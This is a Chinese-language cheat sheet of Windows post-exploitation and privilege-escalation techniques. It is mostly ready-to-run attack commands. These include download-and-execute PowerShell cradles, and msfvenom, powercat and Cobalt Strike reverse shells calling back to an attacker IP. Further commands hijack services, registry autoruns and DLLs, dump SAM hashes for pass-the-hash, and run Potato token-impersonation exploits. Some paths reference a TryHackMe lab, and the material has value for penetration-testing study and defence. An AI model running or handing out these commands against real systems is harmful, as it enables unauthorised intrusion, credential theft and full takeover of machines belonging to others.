# Window提权相关操作和技巧

## Window 下载文件和加载木马

### Window下cmd窗口文件下载

#### bitsadmin

bitsadmin 可以用来在windows 命令行下下载文件。bitsadmin是windows 后台智能传输服务的一个工具，windows
的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。

**bitsadmin的一些特性：**

  * bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。
  * bitsadmin 可以跟随URL跳转.
  * bitsadmin 不像curl wget 这类工具那样能用来下载HTML页面。

用法：

    
    
    bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe c:\users\staccato\desktop\reverse.exe
    # "任务名" 可以随意起，保存文件的文件路径必须是已经存在的目录，否则不能下载。
    
    #默认情况下bitsadmin下载速度极慢，下载较大文件需要设置优先级提速
    start bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe  f:\reverse.exe
    bitsadmin /setpriority test foreground     #设置任务test为最高优先级

#### certutil

windows下一款下载文件的工具，自从WindowsServer 2003就自带。但是在Server
2003使用会有问题。也就是说，以下命令是在Win7及其以后的机器使用。但是该命令的使用会引发杀毒软件的查杀，所以在实际渗透中几乎不适用该命令.

    
    
    certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe #下载文件到当前目录下
    certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe  c:/users/staccato/desktop/reserver.exe        #下载文件到指定目录下

#### iwr

iwr是PowerShell下的一款工具，所以我们如果在cmd下执行该命令的话，需要在前面加powershell命令，但是这会被安全软件检测到。所以在执行前，先进入powershell下。

    
    
    iwr -Uri http://www.test.com/vps.exe -OutFile vps.exe -UseBasicParsing

### Window下加载执行PowerShell脚本

#### 本地加载并执行PowerShell脚本

在cmd当前目录下有PowerView.ps1脚本，并执行其中的Get-Netdomain模块

    
    
    powershell -exec bypass Import-Module .\powerview.ps1;Get-NetDomain

#### 远程下载并执行PowerShell脚本

远程下载并执行test.ps1脚本、远程下载PowerView.ps1脚本，并执行其中的Get-Netdomain模块

    
    
    powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://xx.xx.xx.xx/test.ps1')
    powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://xx.xx.xx.xx/powerview.ps1');import-module .\powerview.ps1;Get-NetDomain

## Window反弹shell

### cmd窗口下反弹MSF shell

    
    
    #VPS上操作
    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.6.54.194 lport=7788 -f psh-reflection -o 7788.ps1        #生成木马文件 7788.ps1
    python -m SimpleHTTPServer 80  #开启web服务
    #MSF监听
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost 10.6.54.194
    set lport 7788
    run
    
    
    #目标机器上操作
    powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://http://10.6.54.194:8000/7788.ps1');xx.ps1"  #后台运行
    或者
    powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.6.54.194:8000/7788.ps1');xx.ps1'

### **cmd窗口下利用Powershell反弹NC shell**

亲测所有机器都适用

    
    
    powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.6.54.194 -p 8888 -e cmd
    
    powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient)DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.6.54.194  -p 8888 -e cmd.exe"

### **cmd窗口下利用Powershell反弹CobaltStrike shell**

windows10 经常性不能用。windows 2008R2以下百分百适用。

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.6.54.194:8080/a'))"   #后台运行
    
    powershell.exe  -c "IEX ((new-object net.webclient).downloadstring('http://10.6.54.194:8080/a'))"

## Window提权

### 信息收集

命令 | 描述  
---|---  
systeminfo | 输出系统信息  
whoami | 获取当前用户名  
whoami /priv | 获取当前用户权限  
ipconfig | 网络配置信息  
net user | 列出用户  
hostname | 查看主机名  
SET | 查看环境变量  
tasklist | 查看进程  
tasklist /svc | 查看进程，显示进程使用者名称  
netstat -ano | 查看系统开放端口  
  
### 相关工具

#### winPEAS

    
    
    https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
    WinPEAS 是一个脚本，用于枚举目标系统以发现权限升级路径。

#### accesschk

    
    
    accesschk是微软提供的一款安全检查工具，是Sysintenals集合中的一款工具，作为确保他们创建安全环境Windows管理员通常需要知道特定用户或组对资源（包括文件、目录、注册表项、全局对象和Windows服务）拥有哪些类型的访问权限。
    accesschk.exe /accepteula( /accepteula一定要加上去，否则会自动弹出一个是否接收许可协议)
    -q          忽略banner
    -u          忽略错误
    -v          详细信息
    -w          只显示拥有可写权的对象
    accesschk.exe /accepteula -uvwqk "路径可以根据WinPEAS返回结果填写"

### 内核漏洞

    
    
    此提权方法是利用系统本身存在的一些系统内核溢出漏洞，但未曾打相应的补丁，通过对比systeminfo信息中的补丁信息来查找缺失的补丁号，通过缺失补丁号对照相应的系统版本查找对应可以提权提升的exp
    
    #手工查找补丁情况
    systeminfo
    Wmic qfe get Caption,Description,HotFixID,InstalledOn
    
    #MSF扫描
    post/windows/gather/enum_patches
    post/multi/recon/local_exploit_suggester
    
    WES-NG:一些漏洞利用枚举脚本（例如 winPEAS）将要求您将它们上传到目标系统并在那里运行。这可能会导致防病毒软件检测并删除它们。为了避免不必要的动静来引起注意，可以使用 WES-NG，WES-NG在攻击机器上运行。
    https://github.com/bitsadmin/wesng
    在目标机器上使用systeminfo > systeminfo.txt 获取信息
    攻击机器上使用以下命令进行比对缺失的补丁
    python wes.py systeminfo.txt

### 服务漏洞

#### 不安全的服务权限

    
    
    使用accesschk检测当前用户user的权限
    accesschk.exe /accepteula -uwcqv user daclsvc
        需要有权限更改服务配置（SERVICE_ALL_ACCESS或SERVICE_QUERY_CONFIG）
    查询拥有该权限组的服务信息
    sc qc 组(如daclsvc)
    
    更改服务关联的可执行文件和帐户(LocalSystem是可用的最高特权帐户)
    sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\"" obj= LocalSystem
    
    重启服务触发有效载荷
    net start daclsvc 或
    sc stop daclsvc 
    sc start daclsvc

#### 未引用的服务路径

    
    
    举例以下未引用的路径
    C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
    由于Disk Sorter Enterprise文件夹名称上有空格，会导致window执行的命令语义不明确。对于window来说有三种执行方式。
    命令                              参数1                 参数2
    C:\MyPrograms\Disk.exe             Sorter               Enterprise\bin\disksrs.exe
    C:\MyPrograms\Disk Sorter.exe      Enterprise\bin\disksrs.exe
    C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
    window会按照标表中显示的顺序搜索每一个可执行文件，先搜索C:\MyPrograms\Disk.exe，如存在，则该服务运行此可执行文件。如不存在，则继续搜索C:\MyPrograms\Disk Sorter.exe，以此类推。
    
    使用sc查询服务配置
    sc qc unquotedsvc
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        SERVICE_START_NAME : LocalSystem
    使用accesschk检查写入权限
    accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
    复制有效载荷重命名到具有写入权限的目录
    copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
    重启服务触发有效载荷
    net start unquotedsvc

#### 不安全的服务可执行文件

    
    
    如果与服务关联的可执行文件具有允许攻击者修改或替换它的弱权限，则攻击者可以轻而易举地获得服务帐户的特权。
    
    使用sc查询服务配置
    sc qc filepermsvc
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        SERVICE_START_NAME : LocalSystem
    使用accesschk检查写入权限
    accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
    复制有效载荷重命名到具有写入权限的目录
    copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
    重启服务触发有效载荷
    net start filepermsvc

#### 弱注册表权限

    
    
    每个服务的窗口注册表存储条目。由于注册表条目可能具有ACL，如果ACL配置错误，即使我们不能直接修改服务，也有可能修改服务的配置。
    
    使用sc查询服务配置
    sc qc regsvc
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        SERVICE_START_NAME : LocalSystem
    使用accesschk或poershell检查写入权限
    C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
    Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
        RW NT AUTHORITY\SYSTEM（NT  AUTHORITY\INTERACTIVE组基本上是所有登录用户可写入）
    覆盖 ImagePath 注册表项指向有效载荷
    reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
    重启服务触发有效载荷
    net start regsvc

### 注册表

#### 自动运行

    
    
    Windows可以配置在启动时运行命令，拥有更高的特权。这些“自动运行”是在注册表中配置的。如果可以写入自动运行可执行文件，并且能够重新启动系统(或等待系统重新启动)，可能会提升权限。
    
    查询可执行文件的注册表
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        REG_SZ    "C:\Program Files\Autorun Program\program.exe"
    使用accesschk检查写入权限   
    accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
    覆盖AutoRun可执行文件
    copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
    开启msf监听重启window，等待管理员重新登录

#### AlwaysInstallElevated

    
    
    Windows安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。通常以启动它的用户的权限级别运行。这些可以配置为以任何用户帐户（甚至是非特权帐户）的更高权限运行。这可能允许我们生成一个以管理员权限运行的恶意MSI文件。
    
    在注册表中查询 AlwaysInstallElevated 键：
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
        两个键都设置为1(0x1),如没有激活AlwaysInstallElevated，则显示为系统找不到指定的注册表项或值
    使用 msfvenom 生成反向 shell  
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.54.194 LPORT=53 -f msi -o reverse.msi
    运行安装程序以触发以 SYSTEM 权限运行的反向 shell
    msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

### 密码

#### 注册表

    
    
    部分情况下可以在注册表中搜索到密码
    reg query HKLM /f password /t REG_SZ /s
    reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

#### SAM

    
    
    Windows在安全帐户管理器(SAM)中存储密码。这些哈希用一个密钥加密，该密钥可以在SYSTEM的文件中找到。如果可以读取SAM和系统文件，则可以提取哈希。SAM和SYSTEM文件位于C:\Windows\System32\config directory在 Windows 运行时，文件已锁定。文件的备份可能存在于C:\Windows\Repairor，C:\Windows\System32\config\RegBack directories
    将SAM和SYSTEM文件传输到攻击机上，使用creddump7转储存hash
    git clone https://github.com/Tib3rius/creddump7
    pip3 install pycrypto
    python3 creddump7/pwdump.py SYSTEM SAM
    将完整的管理员哈希与pth-winexe一起使用，以生成一个以管理员身份运行的shell，而无需破解其密码。完整哈希包括LM和NTLM哈希，以冒号分隔
    pth-winexe -U 'admin%hash' //10.10.146.18 cmd.exe

#### 保存的windows凭据

    
    
    Windows允许我们使用其他用户的凭据。此功能还提供了将这些凭据保存在系统上的选项。
    列出保存的凭据
    cmdkey /list
    虽然看不到实际密码，如果有值得尝试的凭据，可以配合命令 runas 和 /savecred 选项一起使用
    runas /savecred /user:admin cmd.exe

### 启动应用程序

    
    
    Windows有一个应用程序的启动目录，里面的程序可以在登录时自动运行，如果可以在这个目录中创建文件，可以在管理员登录时触发shell提权。必须使用快捷方式文件.lnk。
    使用accesschk检查写入权限
    accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    使用vb脚本创建快捷方式
        Set oWS = WScript.CreateObject("WScript.Shell")
        sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
        Set oLink = oWS.CreateShortcut(sLinkFile)
        oLink.TargetPath = "C:\PrivEsc\reverse.exe"
        oLink.Save
    cscript C:\PrivEsc\CreateShortcut.vbs
    kali开启监听等待管理员登录

### DLL劫持

    
    
    Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：
    1、应用程序加载的目录
    2、C:\Windows\System32
    3、C:\Windows\System
    4、C:\Windows
    5、当前工作目录Current Working Directory，CWD
    6、在PATH环境变量的目录（先系统后用户）
    
    使用MSf生成木马
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.54.194 LPORT=7788 -f dll -o staccato.dll
    利用火绒剑进行进程分析加载DLL，一般寻找程序DLL利用。将木马替换掉程序使用的dll文件等待上线即可。

### 令牌窃取

    
    
    令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。允许在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。
    令牌分为：
    访问令牌(Access Token)：表示访问控制操作主体的系统对象 。
    会话令牌(Session Token)：是交互会话中唯一的身份标识符。
    密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备。
    
    msf 拿到会话
    use incognito           #进入incognito模块
    list_tokens -u          #列出令牌
        Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)
        Impresonation Token：模拟令牌，它是非交互的会话。
    
    impresonate_Token "令牌名" #使用令牌假冒用户

### 土豆

仅当当前帐户有权模拟安全令牌时才能执行此操作。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，因此这通常适用于大多数服务帐户，而不适用于大多数用户级帐户。

#### 烂土豆（Rotten Potato）

    
    
    https://github.com/foxglovesec/RottenPotato
    烂土豆不适用于 >= Windows 10 1809 和 Windows Server 2019 的版本
    
    烂土豆配合MSF提权
        使用令牌窃取进行提权
        use incognito  （进入incognito模块）
        通过MSF执行烂土豆
        execute -cH -f RottenPotato.exe
        list_tokens -u  （列出令牌）
        impersonate_token "NT AUTHORITY\\SYSTEM"

#### 烂土豆NG（Rotten PotatoNG）

    
    
    https://github.com/breenmachine/RottenPotatoNG
    MSFRottenPotato.exe t c:\windows\temp\test.bat

#### 多汁土豆（Juicy Potato）

    
    
    https://github.com/ohpe/juicy-potato
    http://ohpe.it/juicy-potato/CLSID/
    多汁土豆适用于< Windows 10 1809 < Windows Server 2019
    不需要 meterpreter shell，可以指定COM服务器侦听端口，可以选择CLSID
    
    查看当前用户权限，是否符合要求
    whoami /priv
    限制条件：需要支持SeImpersonate或者SeAssignPrimaryToken权限，开启DCOM，本地支持RPC或者远程服务器支持PRC并能成功登录，能够找到可用的COM对象
        如果开启SeImpersonate权限，juicypotato的参数可以使用-t t
        如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u
    使用详情见https://github.com/ohpe/juicy-potato

#### 多汁土豆NG（Juicy PotatoNG）

    
    
    https://github.com/antonioCoco/JuicyPotatoNG
    JuicyPotatoNG.exe -t * -p "C:\windows\system32\cmd.exe" -a "/c whoami > C:\JuicyPotatoNG.txt"

<https://tryhackme.com/room/windows10privesc#>

<https://cloud.tencent.com/developer/article/1771226>

<https://mp.weixin.qq.com/s/UzsBJ3L8MoUr98s8RsOVgw>

<https://zhuanlan.zhihu.com/p/428515900>

<https://www.freebuf.com/articles/web/281863.html>

<https://www.freebuf.com/articles/web/367147.html>

<https://jlajara.gitlab.io/Potatoes_Windows_Privesc>

